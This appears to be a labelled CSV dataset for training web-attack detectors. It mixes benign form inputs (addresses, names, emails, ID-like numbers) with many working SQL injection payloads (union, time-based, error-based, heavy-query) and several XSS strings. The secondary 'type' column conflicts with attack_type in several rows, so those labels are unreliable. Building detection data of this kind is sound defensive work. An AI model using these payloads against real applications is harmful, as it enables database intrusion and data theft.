Text,attack_type,Label,type
"av. escultor pablo gargallo, s/n",norm,0,normal
1'));begin user_lock.sleep(5); end and (('zlsq'='zlsq,sqli,1,sql
2557912970687783,norm,0,normal
8167,norm,0,normal
"-1<div style=""background-image: url(javascript:document.cookie=true;);"">",xss,2,xss
"-2044%')) or elt(9299=3618,3618) and (('%'='",sqli,1,normal
dinelli@alcantarapartners.mt,norm,0,normal
bnrlsi,norm,0,normal
"calle batalla de muhlberg, 25, 6?a",norm,0,normal
42287106l,norm,0,normal
28730070b,norm,0,normal
3120097383483394,norm,0,normal
85766213h,norm,0,normal
pobladura de pelayo garca,norm,0,normal
jarandilla de la vera,norm,0,normal
mccollum.hemsley@cursosdele.bg,norm,0,normal
"-2434) union all select 8310,8310,8310,8310,8310--",sqli,1,sql
1%') rlike (select * from (select(sleep(5)))sgvo) and ('%'=',sqli,1,sql
pealver palenzuela,norm,0,normal
1') where 6624=6624 and 5392=8258,sqli,1,normal
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
8ib6a,norm,0,normal
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1,sql
7202990502846857,norm,0,normal
-8028%'))) or 5042=5214,sqli,1,normal
31228,norm,0,normal
"1) as ocut where 6800=6800 and elt(4249=4249,7259)--",sqli,1,sql
1');select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
costana,norm,0,normal
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""oyuj""=""oyuj",sqli,1,sql
renken,norm,0,normal
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('wdru' like 'wdru",sqli,1,normal
"-7146"" where 6431=6431 or 8548=5549--",sqli,1,sql
-3125'))) order by 1#,sqli,1,normal
1 where 4844=4844;select case when 3252=9622 then 1 else null end--,sqli,1,sql
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'lywy' like 'lywy",sqli,1,sql
yaeger,norm,0,normal
baudoin,norm,0,normal
itrabo,norm,0,normal
"c/ sarda 176, 13c",norm,0,normal
61,norm,0,normal
"1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('xmwj'='xmwj",sqli,1,sql
yoon,norm,0,normal
"union, 32 8-d",norm,0,sql
6966776615880147,norm,0,normal
lieneman,norm,0,normal
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('squj'='squj",sqli,1,sql
"calle poligono quintos, 37,",norm,0,normal
c/ linajes 178 9?f,norm,0,normal
1) and (select * from (select(sleep(5)))fzno) and (6824=6824,sqli,1,sql
43550,norm,0,normal
"1'+(select vupb where 9575=9575 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
7828706714204414,norm,0,normal
"1"") where 6065=6065 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw",sqli,1,sql
roobbie,norm,0,normal
"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('xss');"">",xss,2,xss
16370,norm,0,normal
"1%""));select case when 7717=7717 then 1 else null end--",sqli,1,sql
thunder@bodasconmusica.pm,norm,0,normal
naharro,norm,0,normal
taciano,norm,0,normal
09227,norm,0,normal
"1"");select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
frontado victory,norm,0,normal
11738063j,norm,0,normal
"1"")) as gbxx where 2459=2459 waitfor delay '0:0:5'--",sqli,1,sql
jorey@20horas.ao,norm,0,normal
"1"";select pg_sleep(5) and ""ilyw"" like ""ilyw",sqli,1,sql
"1))) and elt(3114=3114,sleep(5))#",sqli,1,normal
"pl. juan de antxieta, 191, 13?g",norm,0,normal
pealsordo,norm,0,normal
"1""))) and 4124=7245 and (((""tuom""=""tuom",sqli,1,normal
horgan,norm,0,normal
67estada,norm,0,normal
t2591151,norm,0,normal
basilisa,norm,0,normal
"-1999) union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",sqli,1,sql
1)) as bjxd where 4299=4299;select pg_sleep(5)--,sqli,1,sql
huaranga chicon,norm,0,normal
roelos de sayago,norm,0,normal
1'||(select 'mwpd' where 2887=2887;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
"-2448%"") or 3038=3038",sqli,1,normal
desortija0a,norm,0,normal
"1%"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""%""=""",sqli,1,normal
soportador,norm,0,normal
5335,norm,0,normal
sinesio,norm,0,normal
annimamente,norm,0,normal
romero pereyra,norm,0,normal
brbara,norm,0,normal
10836981w,norm,0,normal
gerardo,norm,0,normal
17154,norm,0,normal
"1'||(select 'oyyu' where 6765=6765 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))||'",sqli,1,sql
1745,norm,0,normal
38757754v,norm,0,normal
c/ balanegra 57 8?a,norm,0,normal
popoff,norm,0,normal
"1%')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('%'='",sqli,1,sql
1399422098640864,norm,0,normal
7231,norm,0,normal
dalmau,norm,0,normal
galland-charney@juanpolo.ch,norm,0,normal
03400,norm,0,normal
raphael,norm,0,normal
athwal,norm,0,normal
aran,norm,0,normal
dion0843co,norm,0,normal
"1'+(select 'sqje' where 1634=1634 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))+'",sqli,1,sql
"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# miji",sqli,1,sql
mathieu,norm,0,normal
"c/ duque de medinaceli, 55, 3?f",norm,0,normal
6737,norm,0,normal
8349635911694626,norm,0,normal
"praza algalia de arriba, 188,",norm,0,normal
037r20n0do,norm,0,normal
"1"")) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""wdye"" like ""wdye",sqli,1,sql
"c/ universidad laboral 193,",norm,0,normal
fechner_rabel@fortelingenieria.sd,norm,0,normal
"1)) as xovu where 4530=4530 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1""));begin user_lock.sleep(5); end--",sqli,1,sql
hevia oti,norm,0,normal
begues,norm,0,normal
18611,norm,0,normal
81587818x,norm,0,normal
1';select pg_sleep(5) and 'qfaz' like 'qfaz,sqli,1,sql
verite@culturalsanpedrocf.dm,norm,0,normal
metacntrico,norm,0,normal
yang_lindekens@nightflight.dm,norm,0,normal
6168188961695048,norm,0,normal
relatadora,norm,0,normal
mon3g69l5o,norm,0,normal
santo domingo de las posadas,norm,0,normal
"-4305) as ldrt where 2567=2567 union all select 2567,2567,2567,2567,2567,2567,2567#",sqli,1,sql
"1"";select sleep(5)#",sqli,1,sql
50684,norm,0,normal
mompi tupayachi,norm,0,normal
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",sqli,1,sql
1') and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
"jabeque, 86,",norm,0,normal
callejon huertas 94 7a,norm,0,normal
realmente,norm,0,normal
1')) and (select * from (select(sleep(5)))fzno) and (('vpqr'='vpqr,sqli,1,sql
bauer,norm,0,normal
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1,sql
16127,norm,0,normal
8252,norm,0,normal
luisn,norm,0,normal
stokoski,norm,0,normal
1') where 7903=7903;select (case when (8841=9675) then 8841 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"-4095') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"-9808' in boolean mode) union all select 2528,2528,2528,2528,2528,2528,2528--",sqli,1,sql
"1' in boolean mode) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
ambiental,norm,0,normal
1'+(select qpaf where 7859=7859 or (select * from (select(sleep(5)))ydpu))+',sqli,1,sql
"c/ academia, 59, 3?g",norm,0,normal
"1"")) union all select null,null,null,null,null--",sqli,1,sql
"1));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((3127=3127",sqli,1,sql
hinkie@goovitae.pg,norm,0,normal
"1) as udjn where 6871=6871 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1%'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('%'='",sqli,1,sql
zeisler,norm,0,normal
"1'||(select 'ghby' from dual where 4854=4854;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
1'+(select 'wyed' where 9896=9896;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1,sql
"1%') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('%'='",sqli,1,normal
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)# dyed",sqli,1,sql
"vendeja, 1,",norm,0,normal
7322226923121778,norm,0,normal
16824275m,norm,0,normal
morrin,norm,0,normal
hettie8,norm,0,normal
"1'+(select 'drvv' where 5622=5622 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
71543641w,norm,0,normal
-7901) order by 1--,sqli,1,sql
jayavant,norm,0,normal
">""<iframe src=http://vulnerability-lab.com></iframe>",xss,2,normal
corcoy augu,norm,0,normal
"1)));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
noye,norm,0,normal
baye,norm,0,normal
brunton9,norm,0,normal
3115,norm,0,normal
1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('hgtg'='hgtg,sqli,1,sql
2425930139286993,norm,0,normal
zeina,norm,0,normal
9270,norm,0,normal
a6lastam2en4o,norm,0,normal
"calle condor, 193 10f",norm,0,normal
80scip7l1da,norm,0,normal
canela,norm,0,normal
"telletxe, 119,",norm,0,normal
"1) and make_set(8403=8403,8899)",sqli,1,normal
"calle padre arintero, 149",norm,0,normal
zelma,norm,0,normal
embel1e542,norm,0,normal
bradshaw.ocallaghan@almascanarias.do,norm,0,normal
95531349k,norm,0,normal
15807509t,norm,0,normal
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'mlmu'='mlmu",sqli,1,sql
"1"")) as nwnp where 6140=6140;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
auzmendi ario,norm,0,normal
1%')) and 6969=(select 6969 from pg_sleep(5)) and (('%'=',sqli,1,sql
"1') where 9091=9091 union all select null,null,null,null#",sqli,1,sql
"-5507' or elt(1032=1032,3623) and 'ndqw'='ndqw",sqli,1,normal
4108680786714852,norm,0,normal
jagdish,norm,0,normal
chueh5,norm,0,normal
52930776w,norm,0,normal
tanitans,norm,0,normal
"1) as amgf where 4308=4308 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
"-8038')) or elt(1032=1032,3623) and (('xfyq'='xfyq",sqli,1,normal
qu.8ncen3rio,norm,0,normal
juanhuix,norm,0,normal
raleigh,norm,0,normal
1)) union all select null--,sqli,1,sql
1 where 6036=6036 and 7533=7533--,sqli,1,sql
50513,norm,0,normal
4403,norm,0,normal
"1"" where 7879=7879;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
1) and 2006=2006,sqli,1,normal
2abonos1,norm,0,normal
coraline,norm,0,normal
"1"") where 2656=2656 or sleep(5)--",sqli,1,sql
"1"")) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""giuq""=""giuq",sqli,1,normal
folsom_talli@esteticadayda.tel,norm,0,normal
merande@icodea.va,norm,0,normal
(select (case when (3592=3592) then 3592 else 3592*(select 3592 from information_schema.character_sets) end)),sqli,1,sql
-3424')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('dyuo'='dyuo,sqli,1,sql
i77ovar,norm,0,normal
torie,norm,0,normal
jelisic@sevach.pf,norm,0,normal
"""javascript:alert(1)"">clickme</math>",xss,2,xss
condemios de arriba,norm,0,normal
valls,norm,0,normal
retasac5n,norm,0,normal
sashya,norm,0,normal
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('zcey'='zcey",sqli,1,sql
"-3862')) union all select 2495,2495,2495,2495,2495,2495,2495--",sqli,1,sql
01632755p,norm,0,normal
cochambroso,norm,0,normal
e00tr6o,norm,0,normal
83320221f,norm,0,normal
calbucura bansells,norm,0,normal
lamia,norm,0,normal
kirbee,norm,0,normal
subirs figaredo,norm,0,normal
